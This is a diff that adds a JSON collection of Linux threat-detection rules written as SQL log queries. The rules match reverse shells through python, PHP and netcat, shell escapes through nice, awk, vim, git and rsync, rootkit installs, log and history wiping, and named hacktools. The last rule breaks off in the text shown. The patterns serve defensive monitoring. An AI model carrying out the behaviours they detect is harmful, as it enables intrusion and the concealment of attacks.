@@ -1,0 +1,1194 @@
+[
+    {
+        "title": "Shell Execution via Nice - Linux",
+        "id": "093d68c7-762a-42f4-9f46-95e79142571a",
+        "status": "test",
+        "description": "Detects the use of the \"nice\" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.\n",
+        "author": "Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)",
+        "tags": [
+            "attack.discovery",
+            "attack.t1083"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE Image LIKE '%/nice' ESCAPE '\\' AND (CommandLine LIKE '%/bin/bash' ESCAPE '\\' OR CommandLine LIKE '%/bin/dash' ESCAPE '\\' OR CommandLine LIKE '%/bin/fish' ESCAPE '\\' OR CommandLine LIKE '%/bin/sh' ESCAPE '\\' OR CommandLine LIKE '%/bin/zsh' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Python Reverse Shell Execution Via PTY And Socket Modules",
+        "id": "32e62bc7-3de0-4bb1-90af-532978fe42c0",
+        "status": "test",
+        "description": "Detects the execution of python with calls to the socket and pty module in order to connect and spawn a potential reverse shell.\n",
+        "author": "@d4ns4n_, Nasreddine Bencherchali (Nextron Systems)",
+        "tags": [
+            "attack.execution"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE Image LIKE '%python%' ESCAPE '\\' AND (CommandLine LIKE '% -c %' ESCAPE '\\' AND CommandLine LIKE '%import%' ESCAPE '\\' AND CommandLine LIKE '%pty%' ESCAPE '\\' AND CommandLine LIKE '%socket%' ESCAPE '\\' AND CommandLine LIKE '%spawn%' ESCAPE '\\' AND CommandLine LIKE '%.connect%' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Potential PHP Reverse Shell",
+        "id": "c6714a24-d7d5-4283-a36b-3ffd091d5f7e",
+        "status": "test",
+        "description": "Detects usage of the PHP CLI with the \"-r\" flag which allows it to run inline PHP code. The rule looks for calls to the \"fsockopen\" function which allows the creation of sockets.\nAttackers often leverage this in combination with functions such as \"exec\" or \"fopen\" to initiate a reverse shell connection.\n",
+        "author": "@d4ns4n_",
+        "tags": [
+            "attack.execution"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE Image LIKE '%/php%' ESCAPE '\\' AND (CommandLine LIKE '% -r %' ESCAPE '\\' AND CommandLine LIKE '%fsockopen%' ESCAPE '\\') AND (CommandLine LIKE '%ash%' ESCAPE '\\' OR CommandLine LIKE '%bash%' ESCAPE '\\' OR CommandLine LIKE '%bsh%' ESCAPE '\\' OR CommandLine LIKE '%csh%' ESCAPE '\\' OR CommandLine LIKE '%ksh%' ESCAPE '\\' OR CommandLine LIKE '%pdksh%' ESCAPE '\\' OR CommandLine LIKE '%sh%' ESCAPE '\\' OR CommandLine LIKE '%tcsh%' ESCAPE '\\' OR CommandLine LIKE '%zsh%' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Suspicious Invocation of Shell via AWK - Linux",
+        "id": "8c1a5675-cb85-452f-a298-b01b22a51856",
+        "status": "test",
+        "description": "Detects the execution of \"awk\" or it's sibling commands, to invoke a shell using the system() function.\nThis behavior is commonly associated with attempts to execute arbitrary commands or escalate privileges, potentially leading to unauthorized access or further exploitation.\n",
+        "author": "Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)",
+        "tags": [
+            "attack.execution",
+            "attack.t1059"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE ((Image LIKE '%/awk' ESCAPE '\\' OR Image LIKE '%/gawk' ESCAPE '\\' OR Image LIKE '%/mawk' ESCAPE '\\' OR Image LIKE '%/nawk' ESCAPE '\\') AND CommandLine LIKE '%BEGIN {system%' ESCAPE '\\') AND (CommandLine LIKE '%/bin/bash%' ESCAPE '\\' OR CommandLine LIKE '%/bin/dash%' ESCAPE '\\' OR CommandLine LIKE '%/bin/fish%' ESCAPE '\\' OR CommandLine LIKE '%/bin/sh%' ESCAPE '\\' OR CommandLine LIKE '%/bin/zsh%' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "ESXi Admin Permission Assigned To Account Via ESXCLI",
+        "id": "9691f58d-92c1-4416-8bf3-2edd753ec9cf",
+        "status": "test",
+        "description": "Detects execution of the \"esxcli\" command with the \"system\" and \"permission\" flags in order to assign admin permissions to an account.",
+        "author": "Nasreddine Bencherchali (Nextron Systems)",
+        "tags": [
+            "attack.persistence",
+            "attack.execution",
+            "attack.privilege-escalation",
+            "attack.t1059.012",
+            "attack.t1098"
+        ],
+        "falsepositives": [
+            "Legitimate administration activities"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE Image LIKE '%/esxcli' ESCAPE '\\' AND CommandLine LIKE '%system%' ESCAPE '\\' AND (CommandLine LIKE '% permission %' ESCAPE '\\' AND CommandLine LIKE '% set%' ESCAPE '\\' AND CommandLine LIKE '%Admin%' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Shell Execution Of Process Located In Tmp Directory",
+        "id": "2fade0b6-7423-4835-9d4f-335b39b83867",
+        "status": "test",
+        "description": "Detects execution of shells from a parent process located in a temporary (/tmp) directory",
+        "author": "Joseliyo Sanchez, @Joseliyo_Jstnk",
+        "tags": [
+            "attack.execution"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE ParentImage LIKE '/tmp/%' ESCAPE '\\' AND (Image LIKE '%/bash' ESCAPE '\\' OR Image LIKE '%/csh' ESCAPE '\\' OR Image LIKE '%/dash' ESCAPE '\\' OR Image LIKE '%/fish' ESCAPE '\\' OR Image LIKE '%/ksh' ESCAPE '\\' OR Image LIKE '%/sh' ESCAPE '\\' OR Image LIKE '%/zsh' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Triple Cross eBPF Rootkit Install Commands",
+        "id": "22236d75-d5a0-4287-bf06-c93b1770860f",
+        "status": "test",
+        "description": "Detects default install commands of the Triple Cross eBPF rootkit based on the \"deployer.sh\" script",
+        "author": "Nasreddine Bencherchali (Nextron Systems)",
+        "tags": [
+            "attack.defense-evasion",
+            "attack.t1014"
+        ],
+        "falsepositives": [
+            "Unlikely"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE Image LIKE '%/sudo' ESCAPE '\\' AND (CommandLine LIKE '% tc %' ESCAPE '\\' AND CommandLine LIKE '% enp0s3 %' ESCAPE '\\') AND (CommandLine LIKE '% qdisc %' ESCAPE '\\' OR CommandLine LIKE '% filter %' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Suspicious Java Children Processes",
+        "id": "d292e0af-9a18-420c-9525-ec0ac3936892",
+        "status": "test",
+        "description": "Detects java process spawning suspicious children",
+        "author": "Nasreddine Bencherchali (Nextron Systems)",
+        "tags": [
+            "attack.execution",
+            "attack.t1059"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE ParentImage LIKE '%/java' ESCAPE '\\' AND (CommandLine LIKE '%/bin/sh%' ESCAPE '\\' OR CommandLine LIKE '%bash%' ESCAPE '\\' OR CommandLine LIKE '%dash%' ESCAPE '\\' OR CommandLine LIKE '%ksh%' ESCAPE '\\' OR CommandLine LIKE '%zsh%' ESCAPE '\\' OR CommandLine LIKE '%csh%' ESCAPE '\\' OR CommandLine LIKE '%fish%' ESCAPE '\\' OR CommandLine LIKE '%curl%' ESCAPE '\\' OR CommandLine LIKE '%wget%' ESCAPE '\\' OR CommandLine LIKE '%python%' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Audit Rules Deleted Via Auditctl",
+        "id": "bed26dea-4525-47f4-b24a-76e30e44ffb0",
+        "status": "experimental",
+        "description": "Detects the execution of 'auditctl' with the '-D' command line parameter, which deletes all configured audit rules and watches on Linux systems.\nThis technique is commonly used by attackers to disable audit logging and cover their tracks by removing monitoring capabilities.\nRemoval of audit rules can significantly impair detection of malicious activities on the affected system.\n",
+        "author": "Mohamed LAKRI",
+        "tags": [
+            "attack.defense-evasion",
+            "attack.t1562.012"
+        ],
+        "falsepositives": [
+            "An administrator troubleshooting. Investigate all attempts."
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE Image LIKE '%/auditctl' ESCAPE '\\' AND CommandLine REGEXP '-D'"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Linux HackTool Execution",
+        "id": "a015e032-146d-4717-8944-7a1884122111",
+        "status": "test",
+        "description": "Detects known hacktool execution based on image name.",
+        "author": "Nasreddine Bencherchali (Nextron Systems), Georg Lauenstein (sure[secure])",
+        "tags": [
+            "attack.execution",
+            "attack.resource-development",
+            "attack.t1587"
+        ],
+        "falsepositives": [
+            "Unlikely"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE (Image LIKE '%/crackmapexec' ESCAPE '\\' OR Image LIKE '%/havoc' ESCAPE '\\' OR Image LIKE '%/merlin-agent' ESCAPE '\\' OR Image LIKE '%/merlinServer-Linux-x64' ESCAPE '\\' OR Image LIKE '%/msfconsole' ESCAPE '\\' OR Image LIKE '%/msfvenom' ESCAPE '\\' OR Image LIKE '%/ps-empire server' ESCAPE '\\' OR Image LIKE '%/ps-empire' ESCAPE '\\' OR Image LIKE '%/sliver-client' ESCAPE '\\' OR Image LIKE '%/sliver-server' ESCAPE '\\' OR Image LIKE '%/Villain.py' ESCAPE '\\') OR (Image LIKE '%/cobaltstrike%' ESCAPE '\\' OR Image LIKE '%/teamserver%' ESCAPE '\\') OR (Image LIKE '%/autorecon' ESCAPE '\\' OR Image LIKE '%/httpx' ESCAPE '\\' OR Image LIKE '%/legion' ESCAPE '\\' OR Image LIKE '%/naabu' ESCAPE '\\' OR Image LIKE '%/netdiscover' ESCAPE '\\' OR Image LIKE '%/nuclei' ESCAPE '\\' OR Image LIKE '%/recon-ng' ESCAPE '\\') OR Image LIKE '%/sniper%' ESCAPE '\\' OR (Image LIKE '%/dirb' ESCAPE '\\' OR Image LIKE '%/dirbuster' ESCAPE '\\' OR Image LIKE '%/eyewitness' ESCAPE '\\' OR Image LIKE '%/feroxbuster' ESCAPE '\\' OR Image LIKE '%/ffuf' ESCAPE '\\' OR Image LIKE '%/gobuster' ESCAPE '\\' OR Image LIKE '%/wfuzz' ESCAPE '\\' OR Image LIKE '%/whatweb' ESCAPE '\\') OR (Image LIKE '%/joomscan' ESCAPE '\\' OR Image LIKE '%/nikto' ESCAPE '\\' OR Image LIKE '%/wpscan' ESCAPE '\\') OR (Image LIKE '%/aircrack-ng' ESCAPE '\\' OR Image LIKE '%/bloodhound-python' ESCAPE '\\' OR Image LIKE '%/bpfdos' ESCAPE '\\' OR Image LIKE '%/ebpfki' ESCAPE '\\' OR Image LIKE '%/evil-winrm' ESCAPE '\\' OR Image LIKE '%/hashcat' ESCAPE '\\' OR Image LIKE '%/hoaxshell.py' ESCAPE '\\' OR Image LIKE '%/hydra' ESCAPE '\\' OR Image LIKE '%/john' ESCAPE '\\' OR Image LIKE '%/ncrack' ESCAPE '\\' OR Image LIKE '%/nxc-ubuntu-latest' ESCAPE '\\' OR Image LIKE '%/pidhide' ESCAPE '\\' OR Image LIKE '%/pspy32' ESCAPE '\\' OR Image LIKE '%/pspy32s' ESCAPE '\\' OR Image LIKE '%/pspy64' ESCAPE '\\' OR Image LIKE '%/pspy64s' ESCAPE '\\' OR Image LIKE '%/setoolkit' ESCAPE '\\' OR Image LIKE '%/sqlmap' ESCAPE '\\' OR Image LIKE '%/writeblocker' ESCAPE '\\') OR Image LIKE '%/linpeas%' ESCAPE '\\'"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Triple Cross eBPF Rootkit Execve Hijack",
+        "id": "0326c3c8-7803-4a0f-8c5c-368f747f7c3e",
+        "status": "test",
+        "description": "Detects execution of a the file \"execve_hijack\" which is used by the Triple Cross rootkit as a way to elevate privileges",
+        "author": "Nasreddine Bencherchali (Nextron Systems)",
+        "tags": [
+            "attack.defense-evasion",
+            "attack.privilege-escalation"
+        ],
+        "falsepositives": [
+            "Unlikely"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE Image LIKE '%/sudo' ESCAPE '\\' AND CommandLine LIKE '%execve\\_hijack%' ESCAPE '\\'"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Linux Webshell Indicators",
+        "id": "818f7b24-0fba-4c49-a073-8b755573b9c7",
+        "status": "test",
+        "description": "Detects suspicious sub processes of web server processes",
+        "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
+        "tags": [
+            "attack.persistence",
+            "attack.t1505.003"
+        ],
+        "falsepositives": [
+            "Web applications that invoke Linux command line tools"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE ((ParentImage LIKE '%/httpd' ESCAPE '\\' OR ParentImage LIKE '%/lighttpd' ESCAPE '\\' OR ParentImage LIKE '%/nginx' ESCAPE '\\' OR ParentImage LIKE '%/apache2' ESCAPE '\\' OR ParentImage LIKE '%/node' ESCAPE '\\' OR ParentImage LIKE '%/caddy' ESCAPE '\\') OR (ParentCommandLine LIKE '%/bin/java%' ESCAPE '\\' AND ParentCommandLine LIKE '%tomcat%' ESCAPE '\\') OR (ParentCommandLine LIKE '%/bin/java%' ESCAPE '\\' AND ParentCommandLine LIKE '%websphere%' ESCAPE '\\')) AND (Image LIKE '%/whoami' ESCAPE '\\' OR Image LIKE '%/ifconfig' ESCAPE '\\' OR Image LIKE '%/ip' ESCAPE '\\' OR Image LIKE '%/bin/uname' ESCAPE '\\' OR Image LIKE '%/bin/cat' ESCAPE '\\' OR Image LIKE '%/bin/crontab' ESCAPE '\\' OR Image LIKE '%/hostname' ESCAPE '\\' OR Image LIKE '%/iptables' ESCAPE '\\' OR Image LIKE '%/netstat' ESCAPE '\\' OR Image LIKE '%/pwd' ESCAPE '\\' OR Image LIKE '%/route' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Mask System Power Settings Via Systemctl",
+        "id": "c172b7b5-f3a1-4af2-90b7-822c63df86cb",
+        "status": "experimental",
+        "description": "Detects the use of systemctl mask to disable system power management targets such as suspend, hibernate, or hybrid sleep.\nAdversaries may mask these targets to prevent a system from entering sleep or shutdown states, ensuring their malicious processes remain active and uninterrupted.\nThis behavior can be associated with persistence or defense evasion, as it impairs normal system power operations to maintain long-term access or avoid termination of malicious activity.\n",
+        "author": "Milad Cheraghi, Nasreddine Bencherchali",
+        "tags": [
+            "attack.persistence",
+            "attack.impact",
+            "attack.t1653"
+        ],
+        "falsepositives": [
+            "Unlikely"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE (Image LIKE '%/systemctl' ESCAPE '\\' AND CommandLine LIKE '% mask%' ESCAPE '\\') AND (CommandLine LIKE '%suspend.target%' ESCAPE '\\' OR CommandLine LIKE '%hibernate.target%' ESCAPE '\\' OR CommandLine LIKE '%hybrid-sleep.target%' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Potential Netcat Reverse Shell Execution",
+        "id": "7f734ed0-4f47-46c0-837f-6ee62505abd9",
+        "status": "test",
+        "description": "Detects execution of netcat with the \"-e\" flag followed by common shells. This could be a sign of a potential reverse shell setup.",
+        "author": "@d4ns4n_, Nasreddine Bencherchali (Nextron Systems)",
+        "tags": [
+            "attack.execution",
+            "attack.t1059"
+        ],
+        "falsepositives": [
+            "Unlikely"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE (Image LIKE '%/nc' ESCAPE '\\' OR Image LIKE '%/ncat' ESCAPE '\\') AND (CommandLine LIKE '% -c %' ESCAPE '\\' OR CommandLine LIKE '% -e %' ESCAPE '\\') AND (CommandLine LIKE '% ash%' ESCAPE '\\' OR CommandLine LIKE '% bash%' ESCAPE '\\' OR CommandLine LIKE '% bsh%' ESCAPE '\\' OR CommandLine LIKE '% csh%' ESCAPE '\\' OR CommandLine LIKE '% ksh%' ESCAPE '\\' OR CommandLine LIKE '% pdksh%' ESCAPE '\\' OR CommandLine LIKE '% sh%' ESCAPE '\\' OR CommandLine LIKE '% tcsh%' ESCAPE '\\' OR CommandLine LIKE '%/bin/ash%' ESCAPE '\\' OR CommandLine LIKE '%/bin/bash%' ESCAPE '\\' OR CommandLine LIKE '%/bin/bsh%' ESCAPE '\\' OR CommandLine LIKE '%/bin/csh%' ESCAPE '\\' OR CommandLine LIKE '%/bin/ksh%' ESCAPE '\\' OR CommandLine LIKE '%/bin/pdksh%' ESCAPE '\\' OR CommandLine LIKE '%/bin/sh%' ESCAPE '\\' OR CommandLine LIKE '%/bin/tcsh%' ESCAPE '\\' OR CommandLine LIKE '%/bin/zsh%' ESCAPE '\\' OR CommandLine LIKE '%$IFSash%' ESCAPE '\\' OR CommandLine LIKE '%$IFSbash%' ESCAPE '\\' OR CommandLine LIKE '%$IFSbsh%' ESCAPE '\\' OR CommandLine LIKE '%$IFScsh%' ESCAPE '\\' OR CommandLine LIKE '%$IFSksh%' ESCAPE '\\' OR CommandLine LIKE '%$IFSpdksh%' ESCAPE '\\' OR CommandLine LIKE '%$IFSsh%' ESCAPE '\\' OR CommandLine LIKE '%$IFStcsh%' ESCAPE '\\' OR CommandLine LIKE '%$IFSzsh%' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Shell Execution via Flock - Linux",
+        "id": "4b09c71e-4269-4111-9cdd-107d8867f0cc",
+        "status": "test",
+        "description": "Detects the use of the \"flock\" command to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.\n",
+        "author": "Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)",
+        "tags": [
+            "attack.discovery",
+            "attack.t1083"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE (Image LIKE '%/flock' ESCAPE '\\' AND CommandLine LIKE '% -u %' ESCAPE '\\') AND (CommandLine LIKE '%/bin/bash%' ESCAPE '\\' OR CommandLine LIKE '%/bin/dash%' ESCAPE '\\' OR CommandLine LIKE '%/bin/fish%' ESCAPE '\\' OR CommandLine LIKE '%/bin/sh%' ESCAPE '\\' OR CommandLine LIKE '%/bin/zsh%' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Syslog Clearing or Removal Via System Utilities",
+        "id": "3fcc9b35-39e4-44c0-a2ad-9e82b6902b31",
+        "status": "test",
+        "description": "Detects specific commands commonly used to remove or empty the syslog. Which is a technique often used by attacker as a method to hide their tracks\n",
+        "author": "Max Altgelt (Nextron Systems), Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC",
+        "tags": [
+            "attack.defense-evasion",
+            "attack.t1070.002"
+        ],
+        "falsepositives": [
+            "Log rotation.",
+            "Maintenance."
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE (CommandLine LIKE '%/var/log/syslog%' ESCAPE '\\' AND ((Image LIKE '%/rm' ESCAPE '\\' AND (CommandLine LIKE '% -r %' ESCAPE '\\' OR CommandLine LIKE '% -f %' ESCAPE '\\' OR CommandLine LIKE '% -rf %' ESCAPE '\\' OR CommandLine LIKE '%/var/log/syslog%' ESCAPE '\\')) OR Image LIKE '%/unlink' ESCAPE '\\' OR Image LIKE '%/mv' ESCAPE '\\' OR (Image LIKE '%/truncate' ESCAPE '\\' AND (CommandLine LIKE '%0 %' ESCAPE '\\' AND CommandLine LIKE '%/var/log/syslog%' ESCAPE '\\') AND (CommandLine LIKE '%-s %' ESCAPE '\\' OR CommandLine LIKE '%-c %' ESCAPE '\\' OR CommandLine LIKE '%--size%' ESCAPE '\\')) OR (Image LIKE '%/ln' ESCAPE '\\' AND (CommandLine LIKE '%/dev/null %' ESCAPE '\\' AND CommandLine LIKE '%/var/log/syslog%' ESCAPE '\\') AND (CommandLine LIKE '%-sf %' ESCAPE '\\' OR CommandLine LIKE '%-sfn %' ESCAPE '\\' OR CommandLine LIKE '%-sfT %' ESCAPE '\\')) OR (Image LIKE '%/cp' ESCAPE '\\' AND CommandLine LIKE '%/dev/null%' ESCAPE '\\') OR (Image LIKE '%/shred' ESCAPE '\\' AND CommandLine LIKE '%-u %' ESCAPE '\\'))) OR ((CommandLine LIKE '% > /var/log/syslog%' ESCAPE '\\' OR CommandLine LIKE '% >/var/log/syslog%' ESCAPE '\\' OR CommandLine LIKE '% >| /var/log/syslog%' ESCAPE '\\' OR CommandLine LIKE '%: > /var/log/syslog%' ESCAPE '\\' OR CommandLine LIKE '%:> /var/log/syslog%' ESCAPE '\\' OR CommandLine LIKE '%:>/var/log/syslog%' ESCAPE '\\' OR CommandLine LIKE '%>|/var/log/syslog%' ESCAPE '\\') OR (CommandLine LIKE '%journalctl --vacuum%' ESCAPE '\\' OR CommandLine LIKE '%journalctl --rotate%' ESCAPE '\\'))"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "History File Deletion",
+        "id": "1182f3b3-e716-4efa-99ab-d2685d04360f",
+        "status": "test",
+        "description": "Detects events in which a history file gets deleted, e.g. the ~/bash_history to remove traces of malicious activity",
+        "author": "Florian Roth (Nextron Systems)",
+        "tags": [
+            "attack.impact",
+            "attack.t1565.001"
+        ],
+        "falsepositives": [
+            "Legitimate administration activities"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE (Image LIKE '%/rm' ESCAPE '\\' OR Image LIKE '%/unlink' ESCAPE '\\' OR Image LIKE '%/shred' ESCAPE '\\') AND ((CommandLine LIKE '%/.bash\\_history%' ESCAPE '\\' OR CommandLine LIKE '%/.zsh\\_history%' ESCAPE '\\') OR (CommandLine LIKE '%\\_history' ESCAPE '\\' OR CommandLine LIKE '%.history' ESCAPE '\\' OR CommandLine LIKE '%zhistory' ESCAPE '\\'))"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Shell Execution via Rsync - Linux",
+        "id": "e2326866-609f-4015-aea9-7ec634e8aa04",
+        "status": "experimental",
+        "description": "Detects the use of the \"rsync\" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.\n",
+        "author": "Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.), Florian Roth",
+        "tags": [
+            "attack.execution",
+            "attack.t1059"
+        ],
+        "falsepositives": [
+            "Legitimate cases in which \"rsync\" is used to execute a shell"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE ((Image LIKE '%/rsync' ESCAPE '\\' OR Image LIKE '%/rsyncd' ESCAPE '\\') AND CommandLine LIKE '% -e %' ESCAPE '\\') AND (CommandLine LIKE '%/ash %' ESCAPE '\\' OR CommandLine LIKE '%/bash %' ESCAPE '\\' OR CommandLine LIKE '%/dash %' ESCAPE '\\' OR CommandLine LIKE '%/csh %' ESCAPE '\\' OR CommandLine LIKE '%/sh %' ESCAPE '\\' OR CommandLine LIKE '%/zsh %' ESCAPE '\\' OR CommandLine LIKE '%/tcsh %' ESCAPE '\\' OR CommandLine LIKE '%/ksh %' ESCAPE '\\' OR CommandLine LIKE '%''ash %' ESCAPE '\\' OR CommandLine LIKE '%''bash %' ESCAPE '\\' OR CommandLine LIKE '%''dash %' ESCAPE '\\' OR CommandLine LIKE '%''csh %' ESCAPE '\\' OR CommandLine LIKE '%''sh %' ESCAPE '\\' OR CommandLine LIKE '%''zsh %' ESCAPE '\\' OR CommandLine LIKE '%''tcsh %' ESCAPE '\\' OR CommandLine LIKE '%''ksh %' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Kaspersky Endpoint Security Stopped Via CommandLine - Linux",
+        "id": "36388120-b3f1-4ce9-b50b-280d9a7f4c04",
+        "status": "experimental",
+        "description": "Detects execution of the Kaspersky init.d stop script on Linux systems either directly or via systemctl.\nThis activity may indicate a manual interruption of the antivirus service by an administrator, or it could be a sign of potential tampering or evasion attempts by malicious actors.\n",
+        "author": "Milad Cheraghi",
+        "tags": [
+            "attack.execution",
+            "attack.defense-evasion",
+            "attack.t1562.001"
+        ],
+        "falsepositives": [
+            "System administrator manually stopping Kaspersky services"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE (Image LIKE '%/systemctl' ESCAPE '\\' OR Image LIKE '%/bash' ESCAPE '\\' OR Image LIKE '%/sh' ESCAPE '\\') AND (CommandLine LIKE '%stop%' ESCAPE '\\' AND CommandLine LIKE '%kesl%' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Vim GTFOBin Abuse - Linux",
+        "id": "7ab8f73a-fcff-428b-84aa-6a5ff7877dea",
+        "status": "test",
+        "description": "Detects the use of \"vim\" and it's siblings commands to execute a shell or proxy commands.\nSuch behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.\n",
+        "author": "Nasreddine Bencherchali (Nextron Systems)",
+        "tags": [
+            "attack.discovery",
+            "attack.t1083"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE ((Image LIKE '%/rvim' ESCAPE '\\' OR Image LIKE '%/vim' ESCAPE '\\' OR Image LIKE '%/vimdiff' ESCAPE '\\') AND (CommandLine LIKE '% --cmd%' ESCAPE '\\' OR CommandLine LIKE '% -c %' ESCAPE '\\')) AND (CommandLine LIKE '%:!/%' ESCAPE '\\' OR CommandLine LIKE '%:lua %' ESCAPE '\\' OR CommandLine LIKE '%:py %' ESCAPE '\\' OR CommandLine LIKE '%/bin/bash%' ESCAPE '\\' OR CommandLine LIKE '%/bin/dash%' ESCAPE '\\' OR CommandLine LIKE '%/bin/fish%' ESCAPE '\\' OR CommandLine LIKE '%/bin/sh%' ESCAPE '\\' OR CommandLine LIKE '%/bin/zsh%' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Suspicious Nohup Execution",
+        "id": "457df417-8b9d-4912-85f3-9dbda39c3645",
+        "status": "test",
+        "description": "Detects execution of binaries located in potentially suspicious locations via \"nohup\"",
+        "author": "Joseliyo Sanchez, @Joseliyo_Jstnk",
+        "tags": [
+            "attack.execution"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE Image LIKE '%/nohup' ESCAPE '\\' AND CommandLine LIKE '%/tmp/%' ESCAPE '\\'"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Shell Execution via Git - Linux",
+        "id": "47b3bbd4-1bf7-48cc-84ab-995362aaa75a",
+        "status": "test",
+        "description": "Detects the use of the \"git\" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.\n",
+        "author": "Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)",
+        "tags": [
+            "attack.execution",
+            "attack.t1059"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE ParentImage LIKE '%/git' ESCAPE '\\' AND (ParentCommandLine LIKE '% -p %' ESCAPE '\\' AND ParentCommandLine LIKE '%help%' ESCAPE '\\') AND (CommandLine LIKE '%bash 0<&1%' ESCAPE '\\' OR CommandLine LIKE '%dash 0<&1%' ESCAPE '\\' OR CommandLine LIKE '%sh 0<&1%' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "OMIGOD SCX RunAsProvider ExecuteScript",
+        "id": "6eea1bf6-f8d2-488a-a742-e6ef6c1b67db",
+        "status": "test",
+        "description": "Rule to detect the use of the SCX RunAsProvider ExecuteScript to execute any UNIX/Linux script using the /bin/sh shell.\nScript being executed gets created as a temp file in /tmp folder with a scx* prefix.\nThen it is invoked from the following directory /etc/opt/microsoft/scx/conf/tmpdir/.\nThe file in that directory has the same prefix scx*. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including\nMicrosoft Operations Manager, Microsoft Azure, and Microsoft Operations Management Suite.\n",
+        "author": "Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC",
+        "tags": [
+            "attack.privilege-escalation",
+            "attack.initial-access",
+            "attack.execution",
+            "attack.t1068",
+            "attack.t1190",
+            "attack.t1203"
+        ],
+        "falsepositives": [
+            "Legitimate use of SCX RunAsProvider ExecuteScript."
+        ],
+        "level": "high",
+        "rule": [
